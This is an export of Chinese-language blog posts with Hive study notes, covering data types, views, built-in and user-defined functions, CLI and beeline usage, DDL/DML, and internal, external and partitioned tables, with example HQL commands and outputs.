    <content type="text"><![CDATA[hive数据类型1) 原子数据类型 TinyInt：1byte有符号整数 SmallInt：2byte有符号整数 Int：4byte有符号整数 BigInt：8byte有符号整数 Float：单精度浮点数 Double：双精度浮点数 Boolean：布尔类型 String：字符串 TimeStamp：整数 2) 复杂数据类型 Array\&lt;Type> 由一系列相同数据类型的元素组成 这些元素可以通过 下标 来访问 查询时如果查到返回响应值，没查到则返回null建表：create table person(name string,work_locations array\&lt;string>)row format delimited fields terminated by ‘\t’collection items terminated by ‘,’;导入数据：load data local inpath ‘/home/sigeon/person.txt’ into table person;查询Select work_locations[0] from person; Map&lt;KType, VType&gt; 包含 key-value 键值对 可以通过 key 来访问元素建表语句：create table score(name string, scores map)row format delimited fields terminated by ‘\t’collection items terminated by ‘,’map keys terminated by ‘:’;导入数据：load data local inpath ‘/home/sigeon/score.txt’ into table score;查询语句：Select scores[‘Chinese’] from score; Struct&lt;Param1:Type1, Param1:Type1, … &gt; 可以包含不同数据类型的元素类似于c语言中的结构体 这些元素可以通过 点语法 的方式来得到建表语句：create table course(id int,course struct&lt;name:string, score:int&gt;)row format delimited fields terminated by ‘\t’collection items terminated by ‘,’;导入数据：load data local inpath ‘/ home/sigoen/course.txt’ into table course;查询语句：Select c.course.score from course c; 几个分隔符 指定分隔符要按从外向内的顺序，字段 -&gt; 集合元素 -&gt;map k-v ROW FORMAT：指定分隔符的关键字 DELIMITED FIELDS TERMINATED BY：字段分隔符 COLLECTION ITEMS TERMINATED BY：集合元素分隔符（Array 中的各元素、Struct 中的各元素、 Map 中的 key-value 对之间） MAP KEYS TERMINATED BY：Map 中 key 与 value 的分隔符 LINES TERMINATED BY：行之间的分隔符 hive视图 和关系型数据库一样，Hive也提供了视图的功能 Hive 的视图和关系型数据库的视图有很大的区别： 1、只有逻辑视图，没有物化视图； 2、视图只能查询，不能增删改 (Load|Insert/Update/Delete) 数据； 3、视图在创建时候，只是保存了一份元数据 (存在TBLS中)，当查询视图的时候，才开始执行视图对应的那些子查询视图元数据只存储了hql语句，而不是执行结果 视图操作 创建视图 1create view my_view as &lt;select * from mytable&gt; [limit 500]; 查看视图 show tables; // 显示所有表和视图 show views; //显示所有视图 desc [formatted] view_name; // 查看某个具体视图的(详细)信息视图类型：VIRTUAL_VIEW 删除视图 drop view [if exists] view_name 使用视图 select count(distinct uid) from my_view; hive函数 函数分类 UDF（自定义函数 User-Defined Function）作用于单个数据行，产生一个数据行作为输出。（数学函数，字 符串函数） UDAF（用户定义聚集函数 User-Defined Aggregation Funcation）：接收多个输入数据行，并产 生一个输出数据行。（count，max） UDTF（表格生成函数 User-Defined Table Function）：接收一行输入，输出多行（explode） 内置函数 查看函数命令 查看内置函数： show functions; 显示函数的详细信息： desc function [extended] fun_name;extended：显示扩展信息 分类 关系运算 分类\1. 等值比较: =\2. 等值比较:&lt;=&gt;\3. 不等值比较: &lt;&gt;和!=\4. 小于比较: &lt;\5. 小于等于比较: &lt;=\6. 大于比较: &gt;\7. 大于等于比较: &gt;=\8. 区间比较\9. 空值判断: IS NULL\10. 非空判断: IS NOT NULL\10. LIKE 比较: LIKE\11. JAVA 的 LIKE 操作: RLIKE\12. REGEXP 操作: REGEXP 数学运算 分类\1. 加法操作: +\2. 减法操作: –\3. 乘法操作: *\4. 除法操作: /\5. 取余操作: %\6. 位与操作: &amp;\7. 位或操作: |\8. 位异或操作: ^9．位取反操作: ~ 逻辑运算 分类\1. 逻辑与操作: AND 、&amp;&amp;\2. 逻辑或操作: OR 、||\3. 逻辑非操作: NOT、! 复合类型构造函数 分类 array 结构 map 结构\3. struct 结构\4. named_struct 结构\5. create_union 复合类型操作符 \1. 获取 array 中的元素 \2. 获取 map 中的元素 \3. 获取 struct 中的元素 集合操作函数 \1. map 类型大小：size \2. array 类型大小：size \3. 判断元素数组是否包含元素：array_contains \4. 获取 map 中所有 value 集合 \5. 获取 map 中所有 key 集合 \6. 数组排序 \7. 获取素组或map集合的单个元素（k-v对）：explode() 当同时查询炸裂字段和普通字段时，需要使用横向虚拟视图：lateral view 如：select name,addr.city from usr_addr lateral view(address) addr as city;这里一般需要给 查询结果 和 结果字段 起别名，不然没办法获得每个字段，如果只是查询所有的话就不需要了 类型转换函数 \1. 二进制转换：binary \2. 基础类型之间强制转换：cast 数值计算函数 \1. 取整函数: round \2. 指定精度取整函数: round \3. 向下取整函数: floor \4. 向上取整函数: ceil \5. 向上取整函数: ceiling \6. 取随机数函数: rand \7. 自然指数函数: exp \8. 以 10 为底对数函数: log10 \9. 以 2 为底对数函数: log2 \10. 对数函数: log \11. 幂运算函数: pow \12. 幂运算函数: power \13. 开平方函数: sqrt \14. 二进制函数: bin \15. 十六进制函数: hex \16. 反转十六进制函数: unhex \17. 进制转换函数: conv \18. 绝对值函数: abs \19. 正取余函数: pmod \20. 正弦函数: sin \21. 反正弦函数: asin \22. 余弦函数: cos \23. 反余弦函数: acos \24. positive 函数: positive \25. negative 函数: negative 字符串函数 \1. 字符 ascii 码函数：ascii \2. base64 字符串 \3. 字符串连接函数：concat \4. 带分隔符字符串连接函数：concat_ws \5. 数组转换成字符串的函数：concat_ws \6. 小数位格式化成字符串函数：format_number \7. 字符串截取函数：substr, substring序号从1开始，可以传负数，代表从右开始 \9. 字符串查找函数：instr找到返回一个正整数，未找到返回0 \10. 字符串长度函数：length \11. 字符串查找函数：locate \12. 字符串格式化函数：printf \13. 字符串转换成 map 函数：str_to_map \14. base64 解码函数：unbase64(string str) \15. 字符串转大写函数：upper,ucase \16. 字符串转小写函数：lower,lcase \17. 去空格函数：trim \18. 左边去空格函数：ltrim \19. 右边去空格函数：rtrim \20. 正则表达式替换函数：regexp_replace \21. 正则表达式解析函数：regexp_extract \22. URL 解析函数：parse_url \23. json 解析函数：get_json_object \24. 空格字符串函数：space \25. 重复字符串函数：repeat \26. 左补足函数：lpad \27. 右补足函数：rpad \28. 分割字符串函数: split \29. 集合查找函数: find_in_set \30. 分词函数：sentences \31. 分词后统计一起出现频次最高的 TOP-K \32. 分词后统计与指定单词一起出现频次最高的 TOP-K 日期函数 \1. UNIX 时间戳转日期函数: from_unixtime \2. 获取当前 UNIX 时间戳函数: unix_timestamp \3. 日期转 UNIX 时间戳函数: unix_timestamp \4. 指定格式日期转 UNIX 时间戳函数: unix_timestamp \5. 日期时间转日期函数: to_date \6. 日期转年函数: year \7. 日期转月函数: month \8. 日期转天函数: day \9. 日期转小时函数: hour \10. 日期转分钟函数: minute \11. 日期转秒函数: second \12. 日期转周函数: weekofyear \13. 日期比较函数: datediff \14. 日期增加函数: date_add \15. 日期减少函数: date_sub 条件函数 \1. If 函数: if( 条件 ，true返回参数，false返回参数 ) \2. 当param1不为null返回param1，否则返回param2：nvl(param1, param2) \2. 非空查找函数: coalesce \3. 条件判断函数：case 混合函数 分类\1. 调用 Java 函数：java_method\2. 调用 Java 函数：reflect\3. 字符串的 hash 值：hash XPath 解析 XML 函数 分类\1. xpath\2. xpath_string\3. xpath_boolean\4. xpath_short, xpath_int, xpath_long\5. xpath_float, xpath_double, xpath_number 汇总统计函数（UDAF） \1. 个数统计函数: count \2. 总和统计函数: sum \3. 平均值统计函数: avg \4. 最小值统计函数: min \5. 最大值统计函数: max \6. 非空集合总体变量函数: var_pop \7. 非空集合样本变量函数: var_samp \8. 总体标准偏离函数: stddev_pop \9. 样本标准偏离函数: stddev_samp 10．中位数函数: percentile \11. 中位数函数: percentile \12. 近似中位数函数: percentile_approx \13. 近似中位数函数: percentile_approx \14. 直方图: histogram_numeric \15. 集合去重数：collect_set \16. 集合不去重函数：collect_list 表格生成函数 Table-Generating Functions (UDTF) 分类1．数组拆分成多行：explode(array)2．Map 拆分成多行：explode(map) 自定义函数 \1. 需要继承 org.apache.hadoop.hive.ql.exec.UDF 类，实现一个或多个 evaluate() 方法 \2. 将hive的jar包放在hive的classpath路径下，进入hive客户端，执行命令：add jar \; \3. 检查jar包是否添加成功，执行命令：list jars; \4. 给自定义函数 添加别名，并在hive中 注册 该函数，执行命令：create temporary function myfunc as ‘主类全路径名’;myfunc：自定义函数别名该方法创建的是临时函数，当前客户端关闭就没有了，下次重复第3，4步；真实 生产中就是使用该方法！ \5. 查看hive函数库有没有成功添加，执行命令：show functions; \6. 调用函数时通过函数名和参数列表确定调用的是具体哪一个方法]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Hive</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>Hive</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i-Hive-1]]></title>
    <url>%2F2018%2F06%2F13%2FHadoop%2F3-Hive%2Fi-Hive-1%2F</url>
    <content type="text"><![CDATA[1. Hive 初探1.1 Hive 的数据存储 Hive的数据存储基于Hadoop HDFS Hive没有专门的数据存储格式 存储结构主要包括：数据库、文件、表、视图、索引 Hive默认可以直接加载文本文件（TextFile），还支持SequenceFile、RCFile 创建表时，指定Hive数据的列分隔符与行分隔符，Hive即可解析数据 1.2 Hive的系统架构 用户接口，包括 CLI，JDBC/ODBC，WebUI 元数据存储，通常是存储在关系数据库如 mysql, derby 中 解释器、编译器、优化器、执行器 Hadoop：用 HDFS 进行存储，利用 MapReduce 进行计算 1.3 Hive的系统架构 用户接口主要有三个：CLI，JDBC/ODBC和 WebUI CLI，即Shell命令行 JDBC/ODBC 是 Hive 的Java，与使用传统数据库JDBC的方式类似 WebGUI是通过浏览器访问 Hive Hive 将元数据存储在数据库中(metastore)，目前只支持 mysql、derby。Hive 中的元数据包括表的名字，表的列和分区及其属性，表的属性（是否为外部表等），表的数据所在目录等 解释器、编译器、优化器完成 HQL 查询语句从词法分析、语法分析、编译、优化以及查询计划（plan）的生成。生成的查询计划存储在 HDFS 中，并在随后由 MapReduce 调用执行 Hive 的数据存储在 HDFS 中，大部分的查询由 MapReduce 完成（包含 的查询，比如 select from table 不会生成 MapRedcue 任务 1.4 Hive的metastore metastore是hive元数据的集中存放地。 metastore默认使用内嵌的derby数据库作为存储引擎 Derby引擎的缺点：一次只能打开一个会话 使用Mysql作为外置存储引擎，多用户同时访问 1.5 Hive 和 Hadoop 的调用关系 1、提交sql 交给驱动2、驱动编译 解析相关的字段表信息3、去metastore查询相关的信息 返回字段表信息4、编译返回信息 发给驱动5、驱动发送一个执行计划 交给执行引擎6.1、DDLs 对数据库表的操作的, 直接和metastore交互,create table t1(name string); 6.2、完成job返回数据信息、找namenode查数据6.3、namenode交互select count(1) from t1;7、返回结果信息集 1.6 Hive 参数配置使用 命名空间 使用权限 描述 hivevar 可读写 $ hive -d name=zhangsan; hiveconf 可读写 \$ hive –hiveconf hive.cli.print.current.db=true; $ hive –hiveconf hive.cli.print.header=true; system 可读写 java定义的配置属性，如system:user.name env 只读 shell环境变量，如env:USER hivevar 1234567# 使用场景: 起别名hive -d name=zhangsan #传参&gt; create table t2(name string,$&#123;name&#125; string); #取参数&gt; desc t2;---name stringzhangsan string hiveconf : 12345678910# 显示当前数据库名称[ap@cs2]~% hive --hiveconf hive.cli.print.current.db=true;hive (default)&gt; create database mydb;hive (default)&gt; use mydb;hive (mydb)&gt; # 显示表头(字段名)hive --hiveconf hive.cli.print.header=true;select * from t2;t2.name t2.zhangsan 1.7 Hive 的脚本执行 Hive -e “xx ” e 就是 edit, 在终端打印输出 Hive -e “show tables” &gt;&gt; a.txt 可以把执行结果重定向到文件中 Hive -S -e “show tables” &gt;&gt; a.txt -S : silence 安静的执行 hive -f file hive -f hql , hql 是文件, 执行文件 执行完了之后, 就离开 hive 命令行 hive -i /home/ap/hive-init.sql 执行完了,还在控制台, 可以继续操作 hive&gt;source file source + 文件名 : 直接执行当前目录文件 source /home/ap/xx.sql; 1.8 hive与依赖环境的交互 与linux交互命令 ！ !ls !pwd 与hdfs交互命令 dfs -ls / dfs -mkdir /hive hive (default)&gt; dfs -rm -r /user/hive/warehouse/t5; beeline 与 linux &amp; hdfs 交互 !help 查看帮助 1.9 Hive 的 JDBC 模式 JAVA API交互执行方式 hive 远程服务 (端口号1000 0) 启动方式 hive --service hiveserver2 org.apache.hive.jdbc.HiveDriver 在java代码中调用hive的JDBC建立连接 用 beeline 连接 方式1: 直接登录 注意: 这里的cs2是指的数据库所在的服务器, 如果mysql 安装在 cs2上, 那么不管在哪台机器上登录beeline , 都这样输入就行了 beeline -u jdbc:hive2://cs2:10000 -n ap 方式2: 输入用户名密码登录 !connect jdbc:hive2://cs2:10000 beeline注意点: 使用 beeline 连接时, 貌似无法与 Linux 目录交互 当前目录在/home/ap/apps/apache-hive-2.3.2-bin/bin/下 要传文件的话, 要使用全路径 1.10 SET命令使用 Hive 控制台set 命令 set; set -v; 显示所有的环境变量 set hive.cli.print.current.db=true; set hive.cli.print.header=true; set hive.metastore.warehouse.dir=/hive; hive参数初始化配置set命令: ~/.hiverc 创建此文件, 在此文件中配置初始化命令 补充：hive历史操作命令集~/.hivehistory 2. Hive数据类型2.1 基本数据类型 2.2 复合数据类型 创建学生表 123456CREATE TABLE student( id INT, name STRING, favors ARRAY\&lt;STRING&gt;, scores MAP&lt;STRING, FLOAT&gt;); 默认分隔符 描述 语句 \n 分隔行 LINES TERMINATED BY ‘\t’ ^A 分隔字段(列)，显示编码使用\001 FIELDS TERMINATED BY ‘\001’ ^B 分隔复合类型中的元素，显示编码使用\002 COLLECTION ITEMS TERMINATED BY ‘\002’ ^C 分隔map元素的key和value，显示编码使用\003 MAP KEYS TERMINATED BY ‘\003’ 2.2.1. Struct 使用Structs内部的数据可以通过DOT（.）来存取，例如，表中一列c的类型为STRUCT{a INT; b INT}，我们可以通过c.a来访问域a 123456789101112131415161718192021222324252627282930# 数据1001,zhangsan:241002,lisi:281003,wangwu:25# 1.创建表hive&gt; create table student_test(id INT, info struct&lt;name:STRING, age:INT&gt;)ROW FORMAT DELIMITED FIELDS TERMINATED BY ','COLLECTION ITEMS TERMINATED BY ':';# 2.加载表hive&gt; load data local inpath "student_test" into table student_test;# 3.顺便设置 显示表头,和当前数据库hive&gt; set hive.cli.print.header=true;hive&gt; set hive.cli.print.current.db=true;# 4. 展示所有的hive (default)&gt; select * from student_test;---student_test.id student_test.info1001 &#123;"name":"zhangsan","age":24&#125;1002 &#123;"name":"lisi","age":28&#125;1003 &#123;"name":"wangwu","age":25&#125;---# Struct -结构体-使用 . hive (default)&gt; select id,info.name,info.age from student_test;id name age1001 zhangsan 241002 lisi 281003 wangwu 25 2.2.2. Array 使用Array中的数据为相同类型，例如，假如array A中元素[&#39;a&#39;,&#39;b&#39;,&#39;c’]，则A[1]的值为’b’ 123456789101112131415161718192021222324# 原始数据zhangsan,24:25:27:37lisi,28:39:23:43wangwu,25:23:02:54# 创建表hive (default)&gt; create table class_test(name string,student_id_list array&lt;int&gt;) row format delimited fields terminated by ',' collection items terminated by ':';# 加载表hive (default)&gt; load data local inpath "class_test" into table class_test;# 查看表hive (default)&gt; select * from class_test;OKclass_test.name class_test.student_id_listzhangsan [24,25,27,37]lisi [28,39,23,43]wangwu [25,23,2,54]# 查看数据中某个元素hive (default)&gt; select name, student_id_list[0] from class_test where name='zhangsan';OKname _c1zhangsan 24 2.2.3. Map 使用访问指定域可以通过[“指定域名称”]进行，例如，一个Map M包含了一个group-&gt;gid的kv对，gid的值可以通过M[‘group’]来获取 1234567891011121314151617181920212223242526272829303132333435# 原始数据1001 job:80,team:60,person:701002 job:60,team:80,person:801003 job:90,team:70,person:100# 创建表hive (default)&gt; create table employee(id string,perf map&lt;string,int&gt;) row format delimited fields terminated by '\t' collection items terminated by ',' map keys terminated by ':';# 导入hive (default)&gt; load data local inpath "employee_data" into table employee;# 查看hive (default)&gt; select * from employee;---employee.id employee.perf1001 &#123;"job":80,"team":60,"person":70&#125;1002 &#123;"job":60,"team":80,"person":80&#125;1003 &#123;"job":90,"team":70,"person":100&#125;Time taken: 0.228 seconds, Fetched: 3 row(s)# 查看单个hive (default)&gt; select id,perf['job'],perf['team'],perf['person'] from employee;OKid _c1 _c2 _c31001 80 60 701002 60 80 801003 90 70 100# 显示别名hive (default)&gt; select id,perf['job'] as job,perf['team'] as team,perf['person'] as person from employee;OKid job team person1001 80 60 701002 60 80 801003 90 70 100 3. DDL , DML3.1 DDL3.1.1 数据库定义 默认数据库”default” 使用某个数据库 use &lt;数据库名&gt; 创建一个新库 12345678CREATE DATABASE [IF NOT EXISTS] mydb [LOCATION] '/.......' [COMMENT] '....’;hive&gt;SHOW DATABASES;hive&gt;DESCRIBE DATABASE [extended] mydb;hive&gt;DROP DATABASE [IF EXISTS] mydb [CASCADE]; 创建 create database db1; 删除 drop database if exists db1; 级联删除 drop database if exists db1 cascade; 3.1.2 表定义/修改 创建表 hive&gt;CREATE TABLE IF NOT EXISTS t1(…) [COMMENT ‘….’] [LOCATION ‘…’] hive (default)&gt; create table t4(name string,age int) row format delimited fields terminated by &quot;\t”; hive&gt; SHOW TABLES in mydb; show tables in mydb ‘’class*“ : 查看以 mydb 库中, 以 class 开头的表 hive&gt;CREATE TABLE t2 LIKE t1; 复制表 只会复制表结构 hive (default)&gt; create table t2 like t1; hive (mydb)&gt; create table t3 like default.employee; 复制其它库的表 hive&gt;DESCRIBE t2; desc t2; # 效果一样的 desc extended t1; # 查看更详细的表信息 hive (default)&gt; desc formatted t1; # 格式化查看表的详细信息 drop table xxx; 删除表 查看建表语句 show create table t_table; 修改表 重命名表 ALTER TABLE table_name RENAME TO new_table_name 增加/删除 分区 alter table student_p add partition(part=&#39;a&#39;) partition(part=&#39;b&#39;); 两个 partition中没有’,’ alter table student drop partition(stat_data=‘ffff’), partition(part=‘a’),partiton(part=‘b’); 两个 partition中有’,’ 增加/更新 列 ALTER TABLE table_name ADD|REPLACE COLUMNS (col_name data_type [COMMENT col_comment], ...) 注：ADD是代表新增一字段，字段位置在所有列后面(partition列前)，REPLACE则是表示替换表中所有字段。 alter table student add columns (name1 string); ALTER TABLE table_name CHANGE c_name new_c_name new_c_type [FIRST | AFTER c_name] 3.1.3 列定义 修改列的名称、类型、位置、注释 ALTER TABLE t3 CHANGE COLUMN old_name new_name String COMMENT &#39;...&#39; AFTER column2; 123456789# 修改列名hive (default)&gt; alter table t1 change column name username string comment 'new name';# 查看表hive (default)&gt; desc t1;---col_name data_type commentusername string new nameage int--- 增加列 hive&gt; ALTER TABLE t3 ADD COLUMNS(gender int); 1234567891011121314# 查看表结构hive (default)&gt; desc t3;---col_name data_type commentname string---# 添加列hive (default)&gt; alter table t3 add columns(gender int);---hive (default)&gt; desc t3;---col_name data_type commentname stringgender int 删除列 replace 非常不建议使用, 会造成数据错乱, 一般采取重新创建一张表的方式. 3.1.4 显示命令 show tables show databases show partitions show functions desc extended t_name; desc formatted table_name; 3.2 DML3.2.1 Load 语法结构 LOAD DATA [LOCAL] INPATH &#39;filepath&#39; [OVERWRITE] INTO TABLE tablename [PARTITION (partcol1=val1, partcol2=val2 ...)] 说明： Load 操作只是单纯的复制/移动操作，将数据文件移动到 Hive 表对应的位置。 filepath： 相对路径，例如：project/data1 绝对路径，例如：/user/hive/project/data1 包含模式的完整 URI，例如： hdfs://namenode:9000/user/hive/project/data1 LOCAL关键字 如果指定了 LOCAL， load 命令会去查找本地文件系统中的 filepath。 如果没有指定 LOCAL 关键字，则根据inpath中的uri查找文件 OVERWRITE 关键字 如果使用了 OVERWRITE 关键字，则目标表（或者分区）中的内容会被删除，然后再将 filepath 指向的文件/目录中的内容添加到表/分区中。 如果目标表（分区）已经有一个文件，并且文件名和 filepath 中的文件名冲突，那么现有的文件会被新文件所替代。 3.2.2 Insert语法结构 普通插入 INSERT OVERWRITE TABLE tablename1 [PARTITION (partcol1=val1, partcol2=val2 …)] select_statement1 FROM from_statement Multiple inserts: 12345678910FROM from_statement [INSERT OVERWRITE TABLE tablename1 [PARTITION (partcol1=val1, partcol2=val2 ...)] select_statement1 ][INSERT OVERWRITE TABLE tablename2 [PARTITION ...] select_statement2] ...# 多重插入举例from studentinsert into table student_p partition(part='a')select * where id&lt;95011insert into table student_p partition(part='b')select * where id&gt;95011; Dynamic partition inserts: 不指定分区字段, 按照 from 表的分区字段插入 INSERT OVERWRITE TABLE tablename PARTITION (partcol1, partcol2 ...) select_statement FROM from_statement 导出表数据语法结构 INSERT OVERWRITE [LOCAL] DIRECTORY directory1 SELECT ... FROM ... 123456789101112131415# 导出到本地insert overwrite local directory '/home/ap/test/stucent1'select * from student1;--------------------例子:'查询学生信息，按性别分区，在分区内按年龄有序'0: jdbc:hive2://cs2:10000&gt; set mapred.reduce.tasks=2;No rows affected (0.015 seconds)0: jdbc:hive2://cs2:10000&gt; insert overwrite local directory '/home/ap/ihiveout'. . . . . . . . . . . . .&gt; select * from student distribute by Sex sort by Sage;--------------------# 导出到 HDFS (仅仅是少了一个 local)insert overwrite directory '/test/stucent1'select * from student1; multiple inserts: 123FROM from_statementINSERT OVERWRITE [LOCAL] DIRECTORY directory1 select_statement1[INSERT OVERWRITE [LOCAL] DIRECTORY directory2 select_statement2] ... 4. Hive的数据模型4.1 管理表 - 又称为内部表, 受控表基本操作 创建数据文件inner_table.dat 创建表 hive&gt;create table inner_table (key string); 加载数据 加载本地数据 hive&gt;load data local inpath &#39;/root/inner_table.dat&#39; into table inner_table; 加载HDFS 上数据 hive&gt;load data inpath ‘xxx’ into table xxx; 区别 加载 hdfs 上的数据没有 local 加载本地数据是 copy 一份, 加载 hdfs 上的数据是直接移动数据到加载的表目录下– mv 查看数据 select * from inner_table select count(*) from inner_table 删除表 drop table inner_table 清空表 truncate table table_name; 注意: 如果创建表的时候, 只指定了目录, 没有指定表名, 删除表的时候, 会把该目录下的所有表全部删掉 hive (mydb)&gt; create table t2(id int)location &#39;/home/t2&#39;; 内部表解释 管理表，也称作内部表,受控表 所有的 Table 数据（不包括 External Table）都保存在warehouse这个目录中。 删除表时，元数据与数据都会被删除 创建过程和数据加载过程（这两个过程可以在同一个语句中完成），在加载数据的过程中，实际数据会被移动到数据仓库目录中；之后对数据对访问将会直接在数据仓库目录中完成。删除表时，表中的数据和元数据将会被同时删除 内部表转为外部表, 外部表转为内部表 123456789101112131415161718192021222324252627hive (mydb)&gt; create table t1(id int);# manage_table 转换为 外部表 external_table ## 注意: 修改为外部表时, 后面2个都要大写hive (mydb)&gt; alter table t1 set tblproperties('EXTERNAL'='TRUE');## 修改为内部表hive (mydb)&gt; alter table t1 set tblproperties('EXTERNAL'='FALSE');# 查看t1详细信息desc formatted t1;---Location: hdfs://cs1:9000/user/hive/warehouse/mydb.db/t1Table Type: EXTERNAL_TABLE-- # 删除t1hive (mydb)&gt; drop table t1;# 此时再查看, 已经没了hive (mydb)&gt; show tables;OKtab_name# 但是查看hdfs 路径会发现还在, 因为此表现在已经是外部表, 删除不会删除数据dfs -ls /user/hive/warehouse/mydb.db/t1# 如果此时再创建一个新表 t1, 表结构一样, 则数据会自动加载 4.2 ※ 外部表4.2.1基本操作 创建数据文件external_table.dat 创建表 hive&gt;create external table external_table1 (key string) ROW FORMAT DELIMITED FIELDS TERMINATED BY &#39;\t&#39; location &#39;/home/external’; 在HDFS创建目录/home/external #hadoop fs -put /home/external_table.dat /home/external 在工作中, 一般都这样使用, 把数据上传到 hdfs 中 加载数据 LOAD DATA &#39;/home/external_table1.dat&#39; INTO TABLE external_table1; 查看数据 select * from external_table select count(*) from external_table 删除表 drop table external_table 4.2.2 外部表解释 包含External 的表叫外部表 删除外部表只删除metastore的元数据，不删除hdfs中的表数据 外部表 只有一个过程，加载数据和创建表同时完成，并不会移动到数据仓库目录中，只是与外部数据建立一个链接。当删除一个 外部表 时，仅删除该链接 指向已经在 HDFS 中存在的数据，可以创建 Partition 它和 内部表 在元数据的组织上是相同的，而实际数据的存储则有较大的差异 4.2.3 外部表语法123456789101112CREATE EXTERNAL TABLE page_view( viewTime INT, userid BIGINT, page_url STRING, referrer_url STRING, ip STRING COMMENT 'IP Address of the User', country STRING COMMENT 'country of origination‘) COMMENT 'This is the staging page view table' ROW FORMAT DELIMITED FIELDS TERMINATED BY '\t' LINES TERMINATED BY '\n' STORED AS TEXTFILE LOCATION 'hdfs://centos:9000/user/data/staging/page_view'; 4.2.4外部表注意点: 先创建外部表/内部表, 表名为t3, 再往t3传对应字段的数据, 就可以直接 select 数据了 删除外部表之后, 原本数据不会删除, 此时在相同的父路径创建与被删除表字段相同&amp;名称相同的内部/外部表, 数据也会直接加载 再看一个操作 12345678910# 在 mydb.db 库下创建一个外部表 t5, 指定路径为 '/external/t5'# 此时在 mydb.db 库的路径下是不存在 t5表的, 而是存在 '/external/t5' 中# 但是使用 'show tables' 是存在 t5 的hive (mydb)&gt; create external table t5(id int) location '/external/t5';# 往此目录传数据, 注意: 此时传过去, intdata 数据存在 t5目录下[ap@cs2]~% hadoop fs -put intdata /external/t5[ap@cs2]~% hadoop fs -put intdata /external/t5/i2# 继续传数据, 查询的时候, 就是传的全部数据'相当于所有的数据都在 t5表中'[ap@cs2]~% hadoop fs -put intdata /external/t5# 注意: 如果传到 t5 目录下, 没有指定数据文件名的话, 会默认采用数据的名称文件. 4.3 ※ 分区表4.3.1 基本概念和操作 分区可以理解为分类，通过分类把不同类型的数据放到不同的目录下。 分类的标准就是分区字段，可以一个，也可以多个。 分区表的意义在于优化查询。查询时尽量利用分区字段。如果不使用分区字段，就会全部扫描。 创建分区表, 指定分区字段 hive&gt;CREATE TABLE t3(...) PARTITIONED BY (province string); 创建表的时候, 指定分区字段 keyprovince 为分区字段添加一个值 hive&gt;ALTER TABLE t3 ADD [IF NOT EXISTS] PARTITION(...) LOCATION &#39;...’; alter table t3 add if not exists partition(province=&#39;hubei&#39;) partition(province=&#39;shanghai&#39;); alter table t3 add if not exists partition(province=&#39;jiangsu&#39;); 可为此分区字段添加多个值, 为 province 添加 hubei, hunan…. 查看表的分区字段&amp;值 hive&gt;SHOW PARTITIONS t3 [partition (province=&#39;beijing&#39;)]; 删除分区 hive&gt;ALTER TABLE t3 DROP PARTITION(province=‘beijing’.); 这里是删除北京的分区 (如果是内部表, 会连数据一起删除) 设置表不能被删除/查询 ——– 这里报语法错误, :TODO 防止分区被删除:alter table student_p partition (part=&#39;aa&#39;) enable no_drop; 防止分区被查询:alter table student_p partition (part=&#39;aa&#39;) enable offline; enable 和 disable 是反向操作 其它一些相关命令 SHOW TABLES; # 查看所有的表 SHOW TABLES ‘TMP‘; #支持模糊查询 SHOW PARTITIONS TMP_TABLE; #查看表有哪些分区 DESC TMP_TABLE; #查看表结构 4.3.2 创建分区表完整语法1234567891011CREATE TABLE tmp_table #表名(title string, # 字段名称 字段类型minimum_bid double,quantity bigint,have_invoice bigint)COMMENT '注释：XXX' #表注释 PARTITIONED BY(pt STRING) #分区表字段（如果你文件非常之大的话，采用分区表可以快过滤出按分区字段划分的数据） ROW FORMAT DELIMITED FIELDS TERMINATED BY '\001' # 字段是用什么分割开的STORED AS SEQUENCEFILE; #用哪种方式存储数据，SEQUENCEFILE是hadoop自带的文件压缩格式 4.3.3 分区表注意点(错误点) 1) 分区表在 load 数据的时候, 得指定分区, 否则会报错 123456789101112# 错误1: 分区表在 load 数据的时候, 得指定分区hive (mydb)&gt; load data local inpath '~/ihivedata/intdata' into table t6;FAILED: SemanticException [Error 10062]: Need to specify partition columns because the destination table is partitioned# 错误2: 导入本地数据的时候, 'path'是从当前所在路径开始的hive (mydb)&gt; load data local inpath '~/ihivedata/intdata' into table t6 partition(class='job1');FAILED: SemanticException Line 1:23 Invalid path ''&lt;sub&gt;/ihivedata/intdata'': No files matching path file:/home/ap/&lt;/sub&gt;/ihivedata/intdata# 这里就正确了hive (mydb)&gt; load data local inpath 'ihivedata/intdata' into table t6 partition(class='job1');Loading data to table mydb.t6 partition (class=job1)OK 本质原因: 分区表的分区, 就是在 hdfs 上, 原表的文件夹下面创建了一个子文件夹, 文件夹名就是分区名. 从本地 load 数据: hive (mydb)&gt; load data local inpath &#39;ihivedata/intdata&#39; into table t6 partition(class=&#39;job1&#39;); load 数据指定分区之后, 会直接 load 到数据文件夹里面 2) 没有添加分区时, 直接往不存在的分区导入数据, 分区会自动创建 12# 直接往不存在的分区load数据, 分区会自动创建load data local inpath 'ihivedata/intdata' into table t6 partition(class='job110'); 3) 手动在表中创建分区(文件夹), 并直接向此文件夹中导入数据 12345678910111213141516171819202122232425262728293031323334353637# 直接创建目录hive (mydb)&gt; dfs -mkdir /user/hive/warehouse/mydb.db/t6/class=job120;# 直接从 hadoop 端传数据hadoop fs -put ihivedata/intdata /user/hive/warehouse/mydb.db/t6/class=job120# 此时再 show partitions t6; 会发现并没有此分区---partitionclass=job1class=job110class=job2class=job3class=job4# 此时就需要手动'激活'此分区, 加入了就有了hive (mydb)&gt; alter table t6 add partition(class='job120');---hive (mydb)&gt; show partitions t6;---partitionclass=job1class=job110class=job120class=job2class=job3class=job4# 查看分区信息hive (mydb)&gt; select * from t6 where class='job110';OKt6.id t6.class1 job1102 job1103 job1104 job1105 job110 4.3.4 复合分区基本操作 创建数据文件partition_table.dat 创建表 create table t7(name string,age int)partitioned by(class string,city string)row format delimited fields terminated by &#39;\t&#39; stored as TEXTFILE; 在 Hive 下加载数据到分区 load data local inpath &#39;ihivedata/partidata&#39; into table t7 partition(class=&#39;job1&#39;,city=&#39;beijing&#39;); load data local inpath &#39;ihivedata/partidata&#39; into table t7 partition(class=&#39;job1&#39;,city=&#39;shanghai&#39;); load data local inpath &#39;ihivedata/partidata&#39; into table t7 partition(class=&#39;job2&#39;,city=&#39;ss&#39;); 注意: 多级分区其实就是多级目录 越靠近左边, 目录层级越高; 越靠近右边, 目录层级越低; load 数据到多级分区, load层级必须和整个层级数量相同 也就是说, 如果分区有2层, 传数据的时候, 也必须传2层分区, 并且层级顺序必须一致 从Linux 本地直接导数据到分区 